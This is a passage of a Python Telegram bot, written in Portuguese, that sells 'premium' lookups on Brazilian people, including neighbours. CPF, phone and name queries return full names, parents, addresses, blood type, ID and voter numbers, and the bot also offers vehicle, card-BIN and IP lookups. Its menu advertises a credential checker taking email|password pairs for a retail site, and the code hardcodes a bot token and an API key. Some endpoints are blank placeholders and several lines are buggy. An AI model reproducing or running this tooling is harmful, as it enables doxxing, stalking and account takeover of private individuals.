                                           req['numero'])}</code>\n<strong>CEP:</strong> <code>{str(req['cep'])}</code>\n<strong>MUNICIPIO:</strong> <code>{str(
                                           req['municipio'])}</code>\n<strong>PORTE:</strong> <code>{str(
                                           req['porte'])}</code>\n<strong>ABERTURA:</strong>  <code>{str(
                                           req['abertura'])}</code>\n<strong>FANTASIA:</strong> <code>{str(
                                           req['fantasia'])}</code>\n<strong>STATUS:</strong>  <code>{str(req['status'])}</code>\n<strong>CAPITAL:</strong> <code>{str(
                                           req['capital_social'])}</code>\n\n<strong>QUADRO DE SOCIOS:</strong>{socio}""",
                                       parse_mode='HTML', reply_markup=sucesso)
        else:
            erro = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text='❌', callback_data='ERRO')],
            ])
            bot.editMessageText((chat_id, msg_id),
                                f"❌ <strong>CNPJ INVALIDO!</strong>",
                                parse_mode='HTML', reply_markup=erro)
    if query_data == "CONSULTAR_SCORE":
        aguarde = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text='⌛', callback_data='AGUARDE')],
        ])
        bot.editMessageText((chat_id, msg_id), f"<strong>⌛ AGUARDE...</strong>",
                        parse_mode='HTML', reply_markup=aguarde)
    if query_data == "CONSULTAR_BIN":
        bin = msg['message']['text']
        bin = bin.split('BIN:')
        bin = bin[1]
        bin = re.sub('[^0-9]', '', bin)
        aguarde = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text='⌛', callback_data='AGUARDE')],
        ])
        bot.editMessageText((chat_id, msg_id), f"<strong>⌛ AGUARDE...</strong>",
                        parse_mode='HTML', reply_markup=aguarde)
        req = requests.get(f"https://binssuapi.vercel.app/api/{bin}").text
        json_resultado = json.loads(req)
        if 'Request a Valid BIN' in req:
            erro = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text='❌', callback_data='ERRO')],
            ])
            bot.editMessageText((chat_id, msg_id),
                                f"❌ <strong>BIN INVALIDA!</strong>",
                                parse_mode='HTML', reply_markup=erro)
        else:
            bandeira = json_resultado['data']['vendor']
            tipo = json_resultado['data']['type']
            nivel = json_resultado['data']['level']
            banco = json_resultado['data']['bank']
            pais = json_resultado['data']['country']
            sucesso = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text='✅', callback_data='SUCESSO')],
            ])
            bot.editMessageText((chat_id, msg_id),
                                f"✅ <strong>BIN CONSULTADA COM SUCESSO\nBIN:</strong><code>{bin}</code>\n<strong>BANDEIRA:</strong><code>{bandeira}</code>\n<strong>NIVEL:</strong><code>{nivel}</code>\n<strong>PAIS:</strong><code>{pais}</code>\n<strong>BANCO:</strong><code>{banco}</code>",
                                parse_mode='HTML', reply_markup=sucesso)
    if query_data == "CONSULTAR_IP":
        ip = msg['message']['text']
        ip = ip.split('IP:')
        ip = ip[1]
        ip = re.sub('[^0-9.]', '', ip)
        aguarde = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text='⌛', callback_data='AGUARDE')],
        ])
        bot.editMessageText((chat_id, msg_id), f"<strong>⌛ AGUARDE...</strong>",
                        parse_mode='HTML', reply_markup=aguarde)
        req = requests.get(f"http://ipwhois.app/json/{ip}").text
        print(req)
        json_resultado = json.loads(req)
        if 'invalid IP address' in req:
            erro = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text='❌', callback_data='ERRO')],
            ])
            bot.editMessageText((chat_id, msg_id),
                                f"❌ <strong>IP INVALIDO!</strong>",
                                parse_mode='HTML', reply_markup=erro)
        elif 'reserved range' in req:
            erro = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text='❌', callback_data='ERRO')],
            ])
            bot.editMessageText((chat_id, msg_id),
                                f"❌ <strong>RESERVED RANGE!</strong>",
                                parse_mode='HTML', reply_markup=erro)
        else:
            tipo = json_resultado['type']
            continente = json_resultado['continent']
            pais = json_resultado['country']
            estado = json_resultado['region']
            cidade = json_resultado['city']
            latitude = json_resultado['latitude']
            longitude = json_resultado['longitude']
            asn = json_resultado['asn']
            org = json_resultado['org']
            isp = json_resultado['isp']
            sucesso = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text='✅', callback_data='SUCESSO')],
            ])
            bot.editMessageText((chat_id, msg_id),
                                f"✅ <strong>IP CONSULTADO COM SUCESSO\nIP:</strong><code>{ip}</code>\n<strong>TIPO:</strong><code>{tipo}</code>\n<strong>PAIS:</strong><code>{pais}</code>\n<strong>ESTADO:</strong><code>{estado}</code>\n<strong>CIDADE:</strong><code>{cidade}</code>\n<strong>LATITUDE:</strong><code>{latitude}</code>\n<strong>LONGITUDE:</strong><code>{longitude}</code>\n<strong>ASN:</strong><code>{asn}</code>\n<strong>ORG:</strong><code>{org}</code>\n<strong>ISP:</strong><code>{isp}</code>",
                                parse_mode='HTML', reply_markup=sucesso)
    if query_data == "CONSULTAR_NOME":
        chat_id = msg['message']['chat']['id']
        if usuarios_premium(chat_id) is not True:
            erro = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text='❌', callback_data='ERRO')],
            ])
            bot.editMessageText((chat_id, msg_id),
                                f"❌ <strong>VOCE NAO POSSUI ACESSO PREMIUM!\nPARA OBTER O SEU CONTATE: @Helior11 </strong>",
                                parse_mode='HTML', reply_markup=erro)
        else:
            nome_cons = msg['message']['text']
            nome_cons = nome_cons.split('NOME:')
            nome_cons = nome_cons[1]
            aguarde = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text='⌛', callback_data='AGUARDE')],
            ])
            bot.editMessageText((chat_id, msg_id), f"<strong>⌛ AGUARDE...</strong>",
                        parse_mode='HTML', reply_markup=aguarde)
            print(nome_cons)
            req = requests.get(f"nada").text
            print(req)
            req = req.replace("<br>", "\n")
            if 'NOME' in req:
                sucesso = InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text='✅', callback_data='SUCESSO')],
                ])
                try:
                    bot.editMessageText((chat_id, msg_id),
                            f"✅ <strong>NOME CONSULTADO COM SUCESSO</strong>\n{req}",
                            parse_mode='HTML', reply_markup=sucesso)
                except:
                    erro = InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text='❌', callback_data='ERRO')],
                    ])
                    bot.editMessageText((chat_id, msg_id),
                                 f"❌ <strong>O NOME FOI ENCONTRADO MAS A MENSAGEM FICOU MUITO GRANDE, REFINE A BUSCA!</strong>",
                                 parse_mode='HTML', reply_markup=erro)
            else:
                erro = InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text='❌', callback_data='ERRO')],
                ])
                bot.editMessageText((chat_id, msg_id),
                                f"❌ <strong>NOME NAO ENCONTRADO!</strong>",
                                parse_mode='HTML', reply_markup=erro)
    if query_data == "CONSULTAR_PLACA":
        chat_id = msg['message']['chat']['id']
        if usuarios_premium(chat_id) is not True:
            erro = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text='❌', callback_data='ERRO')],
            ])
            bot.editMessageText((chat_id, msg_id),
                                f"❌ <strong>VOCE NAO POSSUI ACESSO PREMIUM!\nPARA OBTER O SEU CONTATE: @Helior11 </strong>",
                                parse_mode='HTML', reply_markup=erro)
        else:
            pegar_placa = msg['message']['text']
            pegar_placa = pegar_placa.split('PLACA:')
            pegar_placa = pegar_placa[1]
            aguarde = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text='⌛', callback_data='AGUARDE')],
            ])
            bot.editMessageText((chat_id, msg_id), f"<strong>⌛ AGUARDE...</strong>",
                        parse_mode='HTML', reply_markup=aguarde)
            req = requests.get(f"https://apicarros.com/v2/consultas/{placa}/f63e1e63dd231083d38ce929984aac7d", verify=False).text
            json_resultado = json.loads(req)
            if 'Placa Invalida favor usar o formato AAA0X00 ou AAA9999' in req:
                erro = InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text='❌', callback_data='ERRO')],
                ])
                bot.editMessageText((chat_id, msg_id),
                                f"❌ <strong>PLACA INVALIDA!</strong>",
                                parse_mode='HTML', reply_markup=erro)
            else:
                situacao = json_resultado['situacao']
                modelo = json_resultado['modelo']
                if modelo == "Sem Dados":
                    erro = InlineKeyboardMarkup(inline_keyboard=[
                        [InlineKeyboardButton(text='❌', callback_data='ERRO')],
                    ])
                    bot.editMessageText((chat_id, msg_id),
                                        f"❌ <strong>NENHUM DADO ENCONTRADO!</strong>",
                                        parse_mode='HTML', reply_markup=erro)
                else:
                    marca = json_resultado['marca']
                    cor = json_resultado['cor']
                    ano = json_resultado['ano']
                    ano_modelo = json_resultado['anoModelo']
                    placa2 = json_resultado['placa']
                    data = json_resultado['data']
                    municipio = json_resultado['municipio']
                    uf = json_resultado['uf']
                    dataAtualizacaoCaracteristicasVeiculo = json_resultado['dataAtualizacaoCaracteristicasVeiculo']
                    dataAtualizacaoRouboFurto = json_resultado['dataAtualizacaoRouboFurto']
                    dataAtualizacaoAlarme = json_resultado['dataAtualizacaoAlarme']
                    if dataAtualizacaoCaracteristicasVeiculo == "":
                        dataAtualizacaoCaracteristicasVeiculo = "SEM INFORMACAO"
                    if dataAtualizacaoRouboFurto == "":
                        dataAtualizacaoRouboFurto == "SEM INFORMACAO"
                    if dataAtualizacaoAlarme == "":
                        dataAtualizacaoAlarme == "SEM INFORMACAO"
                    id = json_resultado['extra']['id']
                    data_atualiacao = json_resultado['extra']['data_atualiacao']
                    chassi = json_resultado['extra']['chassi']
                    faturado = json_resultado['extra']['faturado']
                    cilindradas = json_resultado['extra']['cilindradas']
                    linha = json_resultado['extra']['linha']
                    motor = json_resultado['extra']['motor']
                    combustivel = json_resultado['extra']['combustivel']['combustivel']
                    potencia = json_resultado['extra']['potencia']
                    nacionalidade = json_resultado['extra']['nacionalidade']['nacionalidade']
                    quantidade_passageiro = json_resultado['extra']['quantidade_passageiro']
                    sucesso = InlineKeyboardMarkup(inline_keyboard=[
                        [InlineKeyboardButton(text='✅', callback_data='SUCESSO')],
                    ])
                    bot.editMessageText((chat_id, msg_id),
                                f"✅ <strong>PLACA CONSULTADA COM SUCESSO\nPLACA:</strong><code>{placa2}</code>\n<strong>SITUACAO:</strong><code>{situacao}</code>\n<strong>CHASSI:</strong><code>{chassi}</code>\n<strong>MODELO:</strong><code>{modelo}</code>\n<strong>MARCA:</strong><code>{marca}</code>\n<strong>COR:</strong><code>{cor}</code>\n<strong>ANO:</strong><code>{ano}</code>\n<strong>ANO DO MODELO:</strong><code>{ano_modelo}</code>\n<strong>MUNICIPIO:</strong><code>{municipio}</code>\n<strong>UF:</strong><code>{uf}</code>\n<strong>DATA ATUALIZACAO CARACTERISTICAS DO VEICULO:</strong><code>{dataAtualizacaoCaracteristicasVeiculo}</code>\n<strong>DATA ATUALIZACAO ROUBO/FURTO:</strong><code>{dataAtualizacaoRouboFurto}</code>\n<strong>DATA ATUALIZACAO ALARME:</strong><code>{dataAtualizacaoAlarme}</code>\n<strong>ID:</strong><code>{id}</code>\n<strong>FATURADO:</strong><code>{faturado}</code>\n<strong>CILINDRADAS:</strong><code>{cilindradas}</code>\n<strong>LINHA:</strong><code>{linha}</code>\n<strong>MOTOR:</strong><code>{motor}</code>\n<strong>COMBUSTIVEL:</strong><code>{combustivel}</code>\n<strong>POTENCIA:</strong><code>{potencia}</code>\n<strong>NACIONALIDADE:</strong><code>{nacionalidade}</code>\n<strong>QUANTIDADE MAXIMA DE PASSAGEIROS:</strong><code>{quantidade_passageiro}</code>",
                                parse_mode='HTML', reply_markup=sucesso)
    if query_data == "CONSULTAR_VIZINHOS":
        chat_id = msg['message']['chat']['id']
        if usuarios_premium(chat_id) is not True:
            erro = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text='❌', callback_data='ERRO')],
            ])
            bot.editMessageText((chat_id, msg_id),
                                f"❌ <strong>VOCE NAO POSSUI ACESSO PREMIUM!\nPARA OBTER O SEU CONTATE: @Helior11 </strong>",
                                parse_mode='HTML', reply_markup=erro)
        else:
            vizinho = msg['message']['text']
            vizinho = vizinho.split('CPF:')
            vizinho = vizinho[1]
            vizinho = re.sub('[^0-9]', '', vizinho)
            aguarde = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text='⌛', callback_data='AGUARDE')],
            ])
            bot.editMessageText((chat_id, msg_id), f"<strong>⌛ AGUARDE...</strong>",
                            parse_mode='HTML', reply_markup=aguarde)
            headerpica = {'Host': 'tudosobretodos.info', 'cache-control': 'max-age=0',
                      'upgrade-insecure-requests': '1', 'save-data': 'on',
                      'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-A107M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36',
                      'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                      'sec-fetch-site': 'cross-site', 'sec-fetch-mode': 'navigate',
                      'sec-fetch-user': '?1',
                      'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br',
                      'accept-language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
                      'cookie': '__cfduid=dc3ac236c5f39888dbd7f585eedf6feb11596724421',
                      'cookie': '_ga=GA1.2.971515152.1596724424',
                      'cookie': '_gid=GA1.2.109978583.1596724424'}
            envia = requests.get("https://tudosobretodos.info/{}".format(vizinho), headers=headerpica).text

            if "itemMoradores" in envia:
                try:
                    viz1 = str(envia.split("<div class='itemMoradores'>")[1].split("<")[0][3:40]) + '\n' + \
                       str(envia.split("<div class='itemMoradores'>")[2].split("<")[0][3:40]) + '\n' + \
                       str(envia.split("<div class='itemMoradores'>")[3].split("<")[0][3:40]) + '\n' + str(
                    envia.split("<div class='itemMoradores'>")[4].split("<")[0][3:40]) + '\n' + \
                       str(envia.split("<div class='itemMoradores'>")[5].split("<")[0][3:40])

                    bot.editMessageText((chat_id, msg_id),
                             f'🔎<strong>CONSULTA DE VIZINHOS</strong>🔍\n\n<strong>VIZINHOS:</strong>\n\n<code>{viz1}</code>',
                             parse_mode='HTML')
                except:
                    try:
                        viz1 = str(envia.split("<div class='itemMoradores'>")[1].split("<")[0][3:40]) + '\n' + \
                           str(envia.split("<div class='itemMoradores'>")[2].split("<")[0][3:40])

                        bot.editMessageText((chat_id, msg_id),
                                 f'🔎<strong>CONSULTA DE VIZINHOS</strong>🔍\n\n<strong>VIZINHOS:</strong>\n<code>{viz1}</code>',
                                 parse_mode='HTML')
                    except:
                        erro = InlineKeyboardMarkup(inline_keyboard=[
                            [InlineKeyboardButton(text='❌', callback_data='ERRO')],
                        ])
                        bot.editMessageText((chat_id, msg_id), '<strong>NENHUM VIZINHO ENCONTRADO!</strong>', parse_mode='HTML', reply_markup=erro)
    if query_data == "CONSULTAR_TELEFONE2":
        chat_id = msg['message']['chat']['id']
        if usuarios_premium(chat_id) is not True:
            erro = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text='❌', callback_data='ERRO')],
            ])
            bot.editMessageText((chat_id, msg_id),
                                f"❌ <strong>VOCE NAO POSSUI ACESSO PREMIUM!\nPARA OBTER O SEU CONTATE: @Helior11 </strong>",
                                parse_mode='HTML', reply_markup=erro)
        else:
            pegar_telefone = msg['message']['text']
            pegar_telefone = pegar_telefone.split('TELEFONE:')
            pegar_telefone = pegar_telefone[1]
            pegar_telefone = re.sub('[^0-9]', '', pegar_telefone)
            aguarde = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text='⌛', callback_data='AGUARDE')],
            ])
            bot.editMessageText((chat_id, msg_id), f"<strong>⌛ AGUARDE...</strong>",
                            parse_mode='HTML', reply_markup=aguarde)
            req = requests.get(f"nada").text
            sucesso = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text='✅', callback_data='SUCESSO')],
            ])
            if 'NOME' in req:
                soup = BeautifulSoup(req)
                cpfs = soup.findAll('a', target="_blank")
                cpfs = str(cpfs)
                splitfoda = cpfs.split('href="resultado.php?cpf=')
                try:
                    cpf1 = re.sub('[^0-9]', '', splitfoda[1])
                except:
                    cpf1 = "CPF NAO ENCONTRADO!"
                try:
                    cpf2 = re.sub('[^0-9]', '', splitfoda[2])
                except:
                    cpf2 = "CPF NAO ENCONTRADO!"
                bot.editMessageText((chat_id, msg_id),
                            f"✅ <strong>TELEFONE CONSULTADO COM SUCESSO\nCPF(s) ENCONTRADO(s):</strong>\n<code>{cpf1}\n{cpf2}</code>",
                         parse_mode='HTML', reply_markup=sucesso)
            else:
                erro = InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text='❌', callback_data='ERRO')],
                ])
                bot.editMessageText((chat_id, msg_id),
                                f"❌ <strong>TELEFONE NAO ENCONTRADO!</strong>",
                                parse_mode='HTML', reply_markup=erro)
    if query_data == "CHECKERS":
        voltar = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text='<<', callback_data='VOLTAR')],
        ])
        bot.editMessageText((chat_id, msg_id),
                            f"<strong>CHK SUBMARINO:</strong>\n<code>/submarino email|senha</code>",
                            parse_mode='HTML', reply_markup=voltar)
    if query_data == "CONSULTAR_NOME2":
        chat_id = msg['message']['chat']['id']
        if usuarios_premium(chat_id) is not True:
            erro = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text='❌', callback_data='ERRO')],
            ])
            bot.editMessageText((chat_id, msg_id),
                                f"❌ <strong>VOCE NAO POSSUI ACESSO PREMIUM!\nPARA OBTER O SEU CONTATE: @Helior11 </strong>",
                                parse_mode='HTML', reply_markup=erro)
        else:
            nome_cons = msg['message']['text']
            nome_cons = nome_cons.split('NOME:')
            nome_cons = nome_cons[1]
            aguarde = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text='⌛', callback_data='AGUARDE')],
            ])
            bot.editMessageText((chat_id, msg_id), f"<strong>⌛ AGUARDE...</strong>",
                        parse_mode='HTML', reply_markup=aguarde)
            print(nome_cons)
            req = requests.get(f"nada").text
            sucesso = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text='✅', callback_data='SUCESSO')],
            ])
            if 'resultado_numero' in req:
                total_resul = req.split('{"resultado_numero":"')
                total_resul = len(total_resul)
                total_resul = total_resul - 1
                print(total_resul)
                json_resultado = json.load(req)
                cpf = ""
                for x in range(0, total_resul):
                    cpf = cpf + json_resultado[x]['cpf'] + "\n"
                print(cpf)
                bot.editMessageText((chat_id, msg_id),
                            f"✅ <strong>NOME CONSULTADO COM SUCESSO\nPESSOAS LOCALIZADAS:</strong>\n<code></code>",
                         parse_mode='HTML', reply_markup=sucesso)
            else:
                erro = InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text='❌', callback_data='ERRO')],
                ])
                bot.editMessageText((chat_id, msg_id),
                                f"❌ <strong>NOME NAO ENCONTRADO!</strong>",
                                parse_mode='HTML', reply_markup=erro)
    if query_data == "CONSULTAR_CPF2":
        chat_id = msg['message']['chat']['id']
        if usuarios_premium(chat_id) is not True:
            erro = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text='❌', callback_data='ERRO')],
            ])
            bot.editMessageText((chat_id, msg_id),
                                f"❌ <strong>VOCE NAO POSSUI ACESSO PREMIUM!\nPARA OBTER O SEU CONTATE: @Helior11 </strong>",
                                parse_mode='HTML', reply_markup=erro)
        else:
            pegar_cpf = msg['message']['text']
            pegar_cpf = pegar_cpf.split('CPF:')
            pegar_cpf = pegar_cpf[1]
            pegar_cpf = re.sub('[^0-9]', '', pegar_cpf)
            aguarde = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text='⌛', callback_data='AGUARDE')],
            ])
            bot.editMessageText((chat_id, msg_id), f"<strong>⌛ AGUARDE...</strong>",
                            parse_mode='HTML', reply_markup=aguarde)
            req = requests.get(f"nada").text
            json_resultado = json.loads(req)
            sucesso = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text='✅', callback_data='SUCESSO')],
            ])
            if 'nome' in req:
                qualidade_dos_dados = json_resultado['msg']['qualidade']
                cns = json_resultado['msg']['cns']
                nome = json_resultado['msg']['nome']
                social = json_resultado['msg']['social']
                mae = json_resultado['msg']['mae']
                pai = json_resultado['msg']['pai']
                vivo = json_resultado['msg']['vivo']
                sexo = json_resultado['msg']['sexo']
                cor = json_resultado['msg']['cor']
                etnia = json_resultado['msg']['etnia']
                sangue = json_resultado['msg']['sangue']
                nascimento = json_resultado['msg']['nascimento']
                nacionalidade = json_resultado['msg']['nacionalidade']
                pais = json_resultado['msg']['pais']
                cidade = json_resultado['msg']['cidade']
                email = json_resultado['msg']['email']
                nomade = json_resultado['msg']['nomade']
                rg = json_resultado['msg']['rg']
                rgEmissor = json_resultado['msg']['rgEmissor']
                rgUf = json_resultado['msg']['rgUf']
                enderecoCidade = json_resultado['msg']['enderecoCidade']
                enderecoTipo = json_resultado['msg']['enderecoTipo']
                enderecoRua = json_resultado['msg']['enderecoRua']
                enderecoNumero = json_resultado['msg']['enderecoNumero']
                enderecoComplemento = json_resultado['msg']['enderecoComplemento']
                enderecoBairro = json_resultado['msg']['enderecoBairro']
                enderecoCep = json_resultado['msg']['enderecoCep']
                if str(social) == "":
                    social = "SEM INFORMAÇÃO"
                if str(etnia) == "":
                    etnia = "SEM INFORMAÇÃO"
                if str(sangue) == "":
                    sangue == "SEM INFORMAÇÃO"
                if str(rg) == "":
                    rg = "SEM INFORMAÇÃO"
                if str(rgUf) == "":
                    rgUf = "SEM INFORMAÇÃO"
                if str(rgEmissor) == "":
                    rgEmissor = "SEM INFORMAÇÃO"
                if str(email) == "":
                    email = "SEM INFORMAÇÃO"
                titulo = json_resultado['msg']['titulo']
                tituloZona = json_resultado['msg']['tituloZona']
                tituloSecao = json_resultado['msg']['tituloSecao']
                carteira = json_resultado['msg']['carteira']
                carteiraEmissao = json_resultado['msg']['carteiraEmissao']
                carteiraSerie = json_resultado['msg']['carteiraSerie']
                if str(titulo) == "":
                    titulo = "SEM INFORMAÇÃO"
                if str(tituloZona) == "":
                    tituloZona = "SEM INFORMAÇÃO"
                if str(tituloSecao) == "":
                    tituloSecao = "SEM INFORMAÇÃO"
                if str(carteira) == "":
                    carteira = "SEM INFORMAÇÃO"
                if str(carteiraEmissao) == "":
                    carteiraEmissao = "SEM INFORMAÇÃO"
                if str(carteiraSerie) == "":
                    carteiraSerie = "SEM INFORMAÇÃO"
                bot.editMessageText((chat_id, msg_id),
                            f"✅ <strong>CPF CONSULTADO COM SUCESSO\n<strong>GRAU DE QUALIDADE DOS DADOS:</strong><code>{qualidade_dos_dados}</code>\nCPF:</strong><code>{pegar_cpf}</code>\n<strong>NOME:</strong><code>{nome}</code>\n<strong>DATA DE NASCIMENTO:</strong><code>{nascimento}</code>\n<strong>NOME SOCIAL:</strong><code>{social}</code>\n<strong>CNS:</strong><code>{cns}</code>\n<strong>MAE:</strong><code>{mae}</code>\n<strong>PAI:</strong><code>{pai}</code>\n<strong>VIVO:</strong><code>{vivo}</code>\n<strong>SEXO:</strong><code>{sexo}</code>\n<strong>COR:</strong><code>{cor}</code>\n<strong>ETNIA:</strong><code>{etnia}</code>\n<strong>SANGUE:</strong><code>{sangue}</code>\n<strong>EMAIL:</strong><code>{email}</code>\n<strong>NACIONALIDADE:</strong><code>{nacionalidade}</code>\n<strong>PAIS:</strong><code>{pais}</code>\n<strong>CIDADE/ESTADO:</strong><code>{enderecoCidade}</code>\n<strong>RUA:</strong><code>{enderecoRua}</code>\n<strong>NUMERO DA CASA:</strong><code>{enderecoNumero}</code>\n<strong>COMPLEMENTO:</strong><code>{enderecoComplemento}</code>\n<strong>BAIRRO:</strong><code>{enderecoBairro}</code>\n<strong>CEP:</strong><code>{enderecoCep}</code>\n\n<strong>OUTROS DOCUMENTOS:\nRG:</strong><code>{rg}</code>\n<strong>RG EMISSOR:</strong><code>{rgEmissor}</code>\n<strong>RG UF:</strong><code>{rgUf}</code>\n\n<strong>TITULO DE ELEITOR:</strong><code>{titulo}</code>\n<strong>ZONA DO TITULO:</strong><code>{tituloZona}</code>\n<strong>SEÇAO DO TITULO:</strong><code>{tituloSecao}</code>\n\n<strong>CARTEIRA DE NASCIMENTO:</strong><code>{carteira}</code>\n<strong>CARTEIRA EMISSAO:</strong><code>{carteiraEmissao}</code>\n<strong>CARTEIRA SERIE:</strong><code>{carteiraSerie}</code>",
                         parse_mode='HTML', reply_markup=sucesso)
            else:
                erro = InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text='❌', callback_data='ERRO')],
                ])
                bot.editMessageText((chat_id, msg_id),
                                f"❌ <strong>CPF NAO ENCONTRADO!</strong>",
                                parse_mode='HTML', reply_markup=erro)
    if query_data == "ERRO":
       bot.deleteMessage(amanobot.message_identifier(msg['message']))
    if query_data == "SUCESSO":
        bot.answerCallbackQuery(callback_query_id=msg['id'], show_alert=False, text="O comando/consulta executado(a) retornou o valor esperado! :)")
    if query_data == "AGUARDE":
        bot.answerCallbackQuery(callback_query_id=msg['id'], show_alert=False, text="Estamos executando o comando informado! :)")
    if query_data == "ENVIAR":
        pegar_msg = msg['message']['text']
        pegar_msg = pegar_msg.split('ENVIADA:')
        pegar_msg = pegar_msg[1]
        aguarde = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text='📬', callback_data='AGUARDE')],
        ])
        bot.editMessageText((chat_id, msg_id), f"<strong>📬 ENVIANDO...</strong>",
                            parse_mode='HTML', reply_markup=aguarde)
    if query_data == "NAO_ENVIAR":
        print('k')
TOKEN = "1895025095:AAEScm4IX_MKW2LAGZlMVS0sdoTI9SAp2cg"

bot = amanobot.Bot(TOKEN)
MessageLoop(bot, {'chat': on_chat_message,
                  'callback_query': on_callback_query}).run_as_thread()

print('BOT ON...')

while 1:
    time.sleep(10)